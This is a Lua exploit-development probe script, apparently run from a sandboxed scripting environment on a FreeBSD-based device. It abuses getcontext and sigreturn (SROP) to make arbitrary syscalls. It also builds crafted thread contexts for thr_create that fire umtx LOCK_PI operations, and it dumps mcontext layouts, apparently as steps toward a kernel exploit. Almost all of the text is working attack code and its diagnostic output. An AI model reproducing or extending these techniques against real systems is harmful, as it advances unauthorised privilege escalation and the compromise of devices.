-- CRASH_CLASS: MODERATE
-- PROBE 142c: thr_create from getcontext snapshot
--
-- 142b: both GPR offset schemes failed to fire LOCK_PI from child threads.
-- New theory: thr_create uses same context format as getcontext/sigreturn.
-- Test: fill context with getcontext, modify SROP-format registers, call thr_create.
-- This preserves FP state, signal mask, and other metadata that set_mcontext needs.

print("=== PROBE 142c: THR FROM GETCTX ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function rq(addr) return memory.read_qword(addr) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_thr_self = make_syscall(432)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

-- SROP format offsets (MC=0x40, validated by dozens of working probes)
local MC = 0x40
local O_RDI = MC + 0x08     -- 0x48
local O_RSI = MC + 0x10     -- 0x50
local O_RDX = MC + 0x18     -- 0x58
local O_R8  = MC + 0x28     -- 0x68
local O_R9  = MC + 0x30     -- 0x70
local O_RAX = MC + 0x38     -- 0x78
local O_R10 = MC + 0x50     -- 0x90
local O_RIP = MC + 0xA0     -- 0xE0
local O_CS  = MC + 0x98     -- 0xD8
local O_RSP = MC + 0xB8     -- 0xF8
local O_SS  = MC + 0xB0     -- 0xF0

-- Get syscall instruction address
local base_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(base_ctx)) end)
local base_rip = rq(base_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

-- SROP helper
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(base_ctx)) end)
    wq(base_ctx + O_RIP, sc_addr)
    wq(base_ctx + O_RAX, uint64(num))
    if a1 then wq(base_ctx + O_RDI, a1) end
    if a2 then wq(base_ctx + O_RSI, a2) end
    if a3 then wq(base_ctx + O_RDX, a3) end
    if a4 then wq(base_ctx + O_R10, a4) end
    if a5 then wq(base_ctx + O_R8, a5) end
    if a6 then wq(base_ctx + O_R9, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(base_ctx)) end)
    return rv
end

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- Main TID
local tid_buf = gpu + 0x100
wq(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local main_tid = safe_rq(tid_buf)
print("main_TID=" .. hex(main_tid))

-- Verify SROP LOCK_PI still works from main thread
local test_futex = gpu + 0x200
memory.write_dword(test_futex, 0)
local rv_test = srop(454, ua(test_futex), uint64(12), uint64(0), uint64(0), uint64(0))
local tf = safe_rd(test_futex)
print("main_LOCK_PI: ret=" .. hex(rv_test) .. " futex=0x" .. string.format("%X", tf or 0))

--------------------------------------------------------------------
-- [A] Method 1: getcontext snapshot → modify SROP offsets → thr_create
-- Use getcontext to fill a complete valid context, then modify registers
--------------------------------------------------------------------
print("")
print("--- [A] getcontext + SROP offsets ---")

local futex1 = gpu + 0x1000
memory.write_dword(futex1, 0)
local stack1 = gpu + 0x10000
zero(stack1, 0x2000)

local tctx1 = memory.alloc(0x500)
-- Fill with getcontext (complete valid context)
pcall(function() return sc_gc(uint64(tctx1)) end)
-- Now modify registers using SROP offsets
wq(tctx1 + O_RIP, sc_addr)               -- syscall instruction
wq(tctx1 + O_RAX, uint64(454))            -- umtx_op
wq(tctx1 + O_RDI, ua(futex1))             -- futex addr
wq(tctx1 + O_RSI, uint64(12))             -- LOCK_PI
wq(tctx1 + O_RDX, uint64(0))
wq(tctx1 + O_R10, uint64(0))
wq(tctx1 + O_R8, uint64(0))
wq(tctx1 + O_RSP, ua(stack1 + 0x1000))    -- thread stack
-- Ensure CS/SS are user mode
wq(tctx1 + O_CS, uint64(0x43))
wq(tctx1 + O_SS, uint64(0x3B))

local tid1 = memory.alloc(8)
wq(tid1, uint64(0xDEADDEAD))

print("[A] Creating thread (getctx+SROP offsets)...")
local ok1, rv1 = pcall(function()
    return sc_thr_create(uint64(tctx1), uint64(tid1), uint64(0))
end)
local ntid1 = rq(tid1)
print("[A] ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1) .. " tid=" .. hex(ntid1))

-- Wait
local ts = memory.alloc(16)
wq(ts, uint64(0)); wq(ts + 8, uint64(300000000))  -- 300ms
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[A] alive pid=" .. to_num(sc20()))
local fv1 = safe_rd(futex1)
print("[A] futex=" .. string.format("0x%X", fv1 or 0))
if fv1 and fv1 ~= 0 then
    print("[A] *** THREAD LOCK_PI SUCCEEDED! ***")
end

--------------------------------------------------------------------
-- [B] Method 2: getcontext → modify with 80a control offsets + SROP GPR offsets
-- Hybrid: use 80a offsets for RIP/RSP/CS/SS, SROP offsets for RAX/RDI/RSI
--------------------------------------------------------------------
print("")
print("--- [B] getcontext + 80a control + SROP GPR ---")

local futex2 = gpu + 0x2000
memory.write_dword(futex2, 0)
local stack2 = gpu + 0x14000
zero(stack2, 0x2000)

local tctx2 = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(tctx2)) end)
-- 80a control register offsets (verified by thr_create thread creation)
local TC = 0x10
wq(tctx2 + TC + 0x80, sc_addr)            -- 80a mc_rip
wq(tctx2 + TC + 0x88, uint64(0x43))       -- 80a mc_cs
wq(tctx2 + TC + 0x90, uint64(0x202))      -- 80a mc_rflags
wq(tctx2 + TC + 0x98, ua(stack2 + 0x1000)) -- 80a mc_rsp
wq(tctx2 + TC + 0xA0, uint64(0x3B))       -- 80a mc_ss
wq(tctx2 + TC + 0x108, uint64(0x480))     -- 80a mc_len
-- SROP GPR offsets (validated by working SROP syscalls)
wq(tctx2 + O_RAX, uint64(454))
wq(tctx2 + O_RDI, ua(futex2))
wq(tctx2 + O_RSI, uint64(12))
wq(tctx2 + O_RDX, uint64(0))
wq(tctx2 + O_R10, uint64(0))
wq(tctx2 + O_R8, uint64(0))

local tid2 = memory.alloc(8)
wq(tid2, uint64(0xDEADDEAD))

print("[B] Creating thread (80a ctrl + SROP GPR)...")
local ok2, rv2 = pcall(function()
    return sc_thr_create(uint64(tctx2), uint64(tid2), uint64(0))
end)
local ntid2 = rq(tid2)
print("[B] ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2) .. " tid=" .. hex(ntid2))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[B] alive pid=" .. to_num(sc20()))
local fv2 = safe_rd(futex2)
print("[B] futex=" .. string.format("0x%X", fv2 or 0))
if fv2 and fv2 ~= 0 then
    print("[B] *** THREAD LOCK_PI SUCCEEDED (hybrid)! ***")
end

--------------------------------------------------------------------
-- [C] Method 3: Full getcontext copy, only change RAX to thr_exit
-- Test if thread actually executes ANY syscall
--------------------------------------------------------------------
print("")
print("--- [C] getcontext + thr_exit at SROP RAX ---")

local marker = gpu + 0x3000
memory.write_dword(marker, 0x42424242)

local stack3 = gpu + 0x18000
zero(stack3, 0x2000)

local tctx3 = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(tctx3)) end)
-- ONLY change RAX to 431 (thr_exit) and RDI to 0
wq(tctx3 + O_RAX, uint64(431))
wq(tctx3 + O_RDI, uint64(0))
wq(tctx3 + O_RIP, sc_addr)
wq(tctx3 + O_RSP, ua(stack3 + 0x1000))
wq(tctx3 + O_CS, uint64(0x43))
wq(tctx3 + O_SS, uint64(0x3B))

local tid3 = memory.alloc(8)
wq(tid3, uint64(0xDEADDEAD))

print("[C] Creating thread (getctx + thr_exit)...")
local ok3, rv3 = pcall(function()
    return sc_thr_create(uint64(tctx3), uint64(tid3), uint64(0))
end)
local ntid3 = rq(tid3)
local n3h, n3l = get_hi_lo(ntid3)
print("[C] ok=" .. tostring(ok3) .. " rv=" .. tostring(rv3) .. " tid=" .. hex(ntid3))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Try thr_kill on the child thread to see if it's alive
if n3l ~= 0xDEADDEAD and n3l ~= 0 then
    local ok_k, rv_k = pcall(function()
        return make_syscall(433)(uint64(n3l), uint64(0))
    end)
    print("[C] thr_kill(0): ok=" .. tostring(ok_k) .. " rv=" .. tostring(rv_k))
    -- rv=0 means thread is alive, rv=-1 means dead or no such thread
end
print("[C] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [D] Method 4: Copy getcontext to GPU memory (kernel can copyin)
-- Maybe the issue is memory.alloc returns Lua heap that kernel can't copyin
--------------------------------------------------------------------
print("")
print("--- [D] getcontext on GPU mem ---")

local futex4 = gpu + 0x4000
memory.write_dword(futex4, 0)
local stack4 = gpu + 0x1C000
zero(stack4, 0x2000)

-- Put context on GPU memory (definitely accessible to kernel)
local tctx4 = gpu + 0x20000
zero(tctx4, 0x500)
-- getcontext into GPU memory
pcall(function() return sc_gc(uint64(tctx4)) end)
-- Modify SROP offsets
wq(tctx4 + O_RIP, sc_addr)
wq(tctx4 + O_RAX, uint64(454))
wq(tctx4 + O_RDI, ua(futex4))
wq(tctx4 + O_RSI, uint64(12))
wq(tctx4 + O_RDX, uint64(0))
wq(tctx4 + O_R10, uint64(0))
wq(tctx4 + O_R8, uint64(0))
wq(tctx4 + O_RSP, ua(stack4 + 0x1000))
wq(tctx4 + O_CS, uint64(0x43))
wq(tctx4 + O_SS, uint64(0x3B))

-- tid output also on GPU
local tid4 = gpu + 0x25000
wq(tid4, uint64(0xDEADDEAD))

print("[D] Creating thread (GPU ctx + SROP offsets)...")
local ok4, rv4 = pcall(function()
    return sc_thr_create(uint64(tctx4), uint64(tid4), uint64(0))
end)
local ntid4 = safe_rq(tid4)
print("[D] ok=" .. tostring(ok4) .. " rv=" .. tostring(rv4) .. " tid=" .. hex(ntid4))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

print("[D] alive pid=" .. to_num(sc20()))
local fv4 = safe_rd(futex4)
print("[D] futex=" .. string.format("0x%X", fv4 or 0))
if fv4 and fv4 ~= 0 then
    print("[D] *** GPU CTX THREAD LOCK_PI SUCCEEDED! ***")
end

-- Also try 80a offsets on GPU memory
local futex4b = gpu + 0x4100
memory.write_dword(futex4b, 0)
local tctx4b = gpu + 0x26000
zero(tctx4b, 0x500)
pcall(function() return sc_gc(uint64(tctx4b)) end)
wq(tctx4b + TC + 0x80, sc_addr)           -- 80a mc_rip
wq(tctx4b + TC + 0x88, uint64(0x43))      -- 80a mc_cs
wq(tctx4b + TC + 0x90, uint64(0x202))     -- 80a mc_rflags
wq(tctx4b + TC + 0x98, ua(stack4 + 0x1000)) -- 80a mc_rsp
wq(tctx4b + TC + 0xA0, uint64(0x3B))      -- 80a mc_ss
wq(tctx4b + TC + 0x108, uint64(0x480))    -- 80a mc_len
-- Standard FreeBSD GPR within mcontext (my derived offsets)
wq(tctx4b + TC + 0x38, uint64(454))       -- mc_rax
wq(tctx4b + TC + 0x08, ua(futex4b))       -- mc_rdi
wq(tctx4b + TC + 0x10, uint64(12))        -- mc_rsi
wq(tctx4b + TC + 0x18, uint64(0))         -- mc_rdx
wq(tid4, uint64(0xDEADDEAD))

print("[D] Creating thread (GPU ctx + 80a ctrl + std GPR)...")
local ok4b, rv4b = pcall(function()
    return sc_thr_create(uint64(tctx4b), uint64(tid4), uint64(0))
end)
local ntid4b = safe_rq(tid4)
print("[D] ok=" .. tostring(ok4b) .. " rv=" .. tostring(rv4b) .. " tid=" .. hex(ntid4b))

pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local fv4b = safe_rd(futex4b)
print("[D] futex4b=" .. string.format("0x%X", fv4b or 0))
if fv4b and fv4b ~= 0 then
    print("[D] *** GPU 80a+STD LOCK_PI SUCCEEDED! ***")
end
print("[D] alive pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- [E] Diagnostic: dump what getcontext puts at key offsets
-- This helps identify the actual mcontext layout
--------------------------------------------------------------------
print("")
print("--- [E] getcontext layout dump ---")
local dump_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(dump_ctx)) end)

-- Dump SROP-format offsets
print("[E] SROP format (MC=0x40):")
print("[E] +0x48 (rdi): " .. hex(rq(dump_ctx + 0x48)))
print("[E] +0x50 (rsi): " .. hex(rq(dump_ctx + 0x50)))
print("[E] +0x58 (rdx): " .. hex(rq(dump_ctx + 0x58)))
print("[E] +0x68 (r8):  " .. hex(rq(dump_ctx + 0x68)))
print("[E] +0x70 (r9):  " .. hex(rq(dump_ctx + 0x70)))
print("[E] +0x78 (rax): " .. hex(rq(dump_ctx + 0x78)))
print("[E] +0x90 (r10): " .. hex(rq(dump_ctx + 0x90)))
print("[E] +0xD8 (cs):  " .. hex(rq(dump_ctx + 0xD8)))
print("[E] +0xE0 (rip): " .. hex(rq(dump_ctx + 0xE0)))
print("[E] +0xF0 (ss):  " .. hex(rq(dump_ctx + 0xF0)))
print("[E] +0xF8 (rsp): " .. hex(rq(dump_ctx + 0xF8)))

-- Dump 80a-format offsets
print("[E] 80a format (MC=0x10):")
print("[E] +0x90 (rip): " .. hex(rq(dump_ctx + 0x90)))
print("[E] +0x98 (cs):  " .. hex(rq(dump_ctx + 0x98)))
print("[E] +0xA0 (rfl): " .. hex(rq(dump_ctx + 0xA0)))
print("[E] +0xA8 (rsp): " .. hex(rq(dump_ctx + 0xA8)))
print("[E] +0xB0 (ss):  " .. hex(rq(dump_ctx + 0xB0)))
print("[E] +0x118(len): " .. hex(rq(dump_ctx + 0x118)))

-- Also dump ctx+0x18 through ctx+0x80 for GPR analysis
print("[E] Raw dump +0x10 to +0x120:")
for off = 0x10, 0x120, 8 do
    local v = safe_rq(dump_ctx + off)
    if v then
        local vh, vl = get_hi_lo(v)
        local tag = ""
        if off == 0x48 then tag = " ← SROP rdi"
        elseif off == 0x78 then tag = " ← SROP rax"
        elseif off == 0x90 then tag = " ← 80a rip / SROP r10"
        elseif off == 0x98 then tag = " ← 80a cs"
        elseif off == 0xD8 then tag = " ← SROP cs"
        elseif off == 0xE0 then tag = " ← SROP rip"
        elseif off == 0xF0 then tag = " ← SROP ss"
        elseif off == 0xF8 then tag = " ← SROP rsp"
        elseif off == 0x118 then tag = " ← 80a mc_len"
        end
        print(string.format("[E] +0x%03X: %s%s", off, hex(v), tag))
    end
end

print("[E] pid=" .. to_num(sc20()))
print("=== DONE ===")
